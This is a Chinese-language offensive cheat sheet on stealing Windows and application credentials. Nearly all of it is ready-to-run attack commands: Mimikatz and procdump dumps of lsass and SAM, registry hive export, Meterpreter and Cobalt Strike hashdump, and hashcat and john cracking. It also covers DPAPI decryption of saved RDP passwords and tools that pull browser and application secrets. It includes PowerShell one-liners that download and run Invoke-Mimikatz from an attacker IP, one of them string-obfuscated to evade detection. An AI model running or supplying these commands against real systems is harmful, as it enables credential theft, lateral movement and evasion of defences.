# Windows密码凭证获取

## Hash存储位置

`Windows Hash`一般存储在两个地方：

> SAM 文件，存储在本机，对应本地用户
> NTDS.DIT 文件，存储在域控上，对应域用户

文件位置：

> SAM：
> C:\windows\system32\config\SAM
> NTDS.DIT：
> C:\windows\NTDS\NTDS.dit

## 系统用户凭证获取

### Mimikatz

#### 本地交互式

```mimkatz
mimikztz.exe
mimikatz # privilege::debug
mimikatz # log re.txt
mimikatz # sekurlsa::logonpasswords
mimikatz # exit

mimikztz.exe
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # log res.txt
mimikatz # lsadump::sam
mimikatz # lsadump::secrets
```

#### 本地非交互式

```mimkatz
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords""exit" > log.txt
mimikatz.exe "log re.txt" "privilege::debug" "sekurlsa::logonpasswords" "exit"
mimikatz.exe "log res.txt" "privilege::debug" "token::elevate" "lsadump::sam" "lsadump::secrets" "exit"
```

#### powershell加载本地mimikatz脚本

```
powershell -ep bypass Import-Module .\Invoke-Mimikatz.ps1;Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonPasswords"'

powershell -ep bypass Import-Module .\Invoke-Mimikatz.ps1;Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "lsadump::sam"'
```

#### Powershell远程加载mimikatz脚本

```shell
powershell IEX (New-ObjectNet.WebClient).DownloadString('http://192.168.81.154:8000/Invoke-Mimikatz.ps1');Invoke-Mimikatz –DumpCreds

powershell IEX (New-ObjectNet.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds
```

#### powershell混淆

```
powershell -c "('IEX '+'(Ne'+'w-O'+'bject Ne'+'t.W'+'ebClien'+'t).Do'+'wnloadS'+'trin'+'g'+'('+'1vchttp://'+'192.168.81'+'.154:8000/'+'Inv'+'oke-Mimik'+'a'+'tz.'+'ps11v'+'c)'+';'+'I'+'nvoke-Mimika'+'tz').REplaCE('1vc',[STRing][CHAR]39)|IeX"
```

#### Get-Hashes

Powershell 加载 Get-PassHashes 脚本：

```
powershell IEX(new-objectnet.webclient).downloadstring('http://192.168.81.154:8000/Get-PassHashes.ps1');Get-PassHashes
```

#### Procdump+Mimikatz

`Procdump`导出`lsass`进程（管理员权限）

```
For 32bits：
procdump.exe -accepteula -ma lsass.exe lsass.dmp

For 64bits：
procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp
```

使用`mimikatz`还原密码（放在靶机上，带着`lsass.dmp`文件）：

```
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords" "exit"
```

### 注册表导出Hash

```
reg save HKLM\SYSTEM system.hiv
reg save HKLM\SAM sam.hiv
reg save HKLM\SECURITY security.hiv
```

#### Mimikatz

```
mimikatz.exe "lsadump::sam /system:system.hiv /sam:sam.hiv" "exit"
```

#### Impacket

```
python3 secretsdump.py -sam sam.hiv -security security.hiv -system system.hiv LOCAL
```

### Meterpreter获取Hash

提前先通过msf获得shell

获得Meterpreter的session会话

Hashdump

```msf
meterpreter > run post/windows/gather/hashdump
```

在msf里

```
load kiwi
creds_all     # 列举系统中的明文密码
lsa_dump_sam  # 读取sam文件
kiwi_cmd -h   # 查看基础命令
kiwi_cmd ::   # 查看有哪些模块，kiwi_cmd命令后面接mimikatz的模块命令
kiwi_cmd lsadump::sam   # 从Windows的sam文件中读取密码hash值
kiwi_cmd sekurlsa::logonpasswords # 获取明文密码
```

## CobaltStrike获取Hash

```
beacon> hashdump
beacon> logonpasswords
beacon> mimikatz sekurlsa::logonpasswords
beacon> mimikatz lsadump::sam
```

## Windows Hash破解

### Hashcat

**Hashcat 破解 LM Hash**

```bash
hashcat -a 0 -m 3000 --force 'E52CAC67419A9A224A3B108F3FA6CB6D' password.txt
```

**Hashcat 破解 NTLM Hash**

```bash
hashcat -a 0 -m 1000 --force '1F2916B7561885601287D5F693567A34' password.txt
```

## 其他密码凭证获取

### RDP连接密码解密

查看本地机器本地连接过的目标机器。

```
reg query "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /s
```

查看本地用户此目录下是否存有RDP密码文件

```
dir /a %userprofile%\AppData\Local\Microsoft\Credentials\*
```

查看保存在本地的远程主机信息

```
cmdkey /list
```

选择一个密码文件对其进行解密。

此处需要记录下 guidMasterKey 的值，待会要通过 guidMasterKey 找对应的Masterkey 。

```
privilege::debug
dpapi::cred /in:C:\Users\mingy\AppData\Local\Microsoft\Credentials\1E85A94EE31F584E484B8120E3ADA266
```

根据 guidMasterKey 找到对应的 Masterkey

```
sekurlsa::dpapi
```

通过 Masterkey 解密 pbData 数据，拿到明文 RDP 连接密码

```
dpapi::cred/in:C:\Users\mingy\AppData\Local\Microsoft\Credentials\1E85A94EE31F584E484B8120E3ADA266 /masterkey:f391aa638da6b6d846685f84660ee638bd6d3122214de34285b4dd3bd827a5c3925c5bd7a448c175457c19b2556c9f6f5248ef9256060a5b74c1264d3a5a99f8
```

#### List-RDP-Connections-History

```
powershell -exec bypass .\ListLogged-inUsers.ps1
```

#### Cobaltstrike

```
beacon> shell reg query "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /s
beacon> shell dir /a %userprofile%\AppData\Local\Microsoft\Credentials\*

mimikatz "privilege::debug" "dpapi::cred/in:C:\Users\mingy\AppData\Local\Microsoft\Credentials\8CAC243098BA9DDD4EAB58433B85D7F0" "exit"
```

## MySQL数据库密码破解

### 1. MySQL数据库文件类型

MYSQL数据库文件共有 frm 、 MYD 和 MYI 三种文件
".frm" 是描述表结构的文件
".MYD" 是表的数据文件
".MYI" 是表数据文件中任何索引的数据树

### 2. MySQL加密方式

### 3. 获取MySQL数据库密码hash值

用winhex编辑器打开user.MYD文件，使用二进制模式查看，即可得到密码Hash值

### 4. Hash破解

在线网站破解

> www.cmd5.com
> www.somd5.com

hashcat破解

```bash
hashcat.exe -m 300 -a 381F5E21E35407D884A6CD4A731AEBFB6AF209E1B
```

john the ripper 破解

```
john --list=formats | grep mysql
echo '*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B' > mysql.hash
john --format=mysql-sha1 mysql.hash
```

## 应用程序密码解密

对密码已保存在 Windwos 系统上的部分程序进行解析，包括：Navicat,TeamViewer,FileZilla,WinSCP,Xmangager 系列产品（ Xshell,Xftp )。

> https://github.com/uknowsec/SharpDecryptPwd
>
> https://github.com/RowTeam/SharpDecryptPwd

HackBrowserData 是一个浏览器数据（密码|历史记录|Cookie|书签|信用卡|下载记录|localStorage|浏览器插件）的导出工具，支持全平台主流浏览器。

> https://github.com/moonD4rk/HackBrowserData